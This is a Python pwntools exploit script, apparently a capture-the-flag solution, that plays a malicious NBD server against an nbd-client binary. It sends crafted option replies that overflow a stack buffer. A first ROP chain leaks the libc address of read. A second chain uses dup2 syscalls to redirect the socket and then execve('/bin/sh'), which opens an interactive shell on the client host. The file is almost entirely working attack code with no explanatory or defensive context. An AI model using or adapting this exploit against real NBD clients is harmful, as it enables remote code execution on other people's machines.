from pwn import *

elf = ELF('./nbd-client')
libc = ELF('./libc-2.31.so')
p = process(['nc', '-lnvp', '9999'])

pause()

p.send(b'NBDMAGIC')                     # INIT_PASSWD
p.send(b'IHAVEOPT'[::-1])
p.send(b'\x00\x01')                     # tmp

p.send(p64(0xa965550489e80300))         # rep_magic
p.send(b'a'*4)                          # opt_server
p.send(b'\x00\x00\x00\x02')             # reptype
p.send(b'\x00\x00\x10\x00')             # len
p.send(b'\x00\x00\x01\x00')             # lenn

p.sendline(b'')

sleep(0.5)

pop_rdi = 0x402b56
pop_rsi = 0x40419d

payload = b'\x00'*0x424
payload += p32(1)
payload += b'\x00'*0x40
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(elf.got['read'])
payload += p64(elf.sym['write'])
payload += p64(0x00404360)

p.send(payload)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['read']
print(hex(libc.address))

system = libc.sym['system']
pop_rax = libc.address + 0x36174
pop_rdx = libc.address + 0x142c92
syscall = libc.address + 0x630a9
bin_sh = next(libc.search(b'/bin/sh'))

p.send(p64(0xa965550489e80300))         # rep_magic
p.send(b'a'*4)                          # opt_server
p.send(b'\x00\x00\x00\x02')             # reptype
p.send(b'\x00\x00\x10\x00')             # len
p.send(b'\x00\x00\x01\x00')             # lenn

p.sendline(b'')

sleep(0.5)

payload = b'\x00'*0x424
payload += p32(1)
payload += b'\x00'*0x40
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(33)
payload += p64(syscall)
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(33)
payload += p64(syscall)
payload += p64(pop_rsi)
payload += p64(2)
payload += p64(pop_rax)
payload += p64(33)
payload += p64(syscall)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p.send(payload)

p.recvrepeat(0.5)

p.interactive()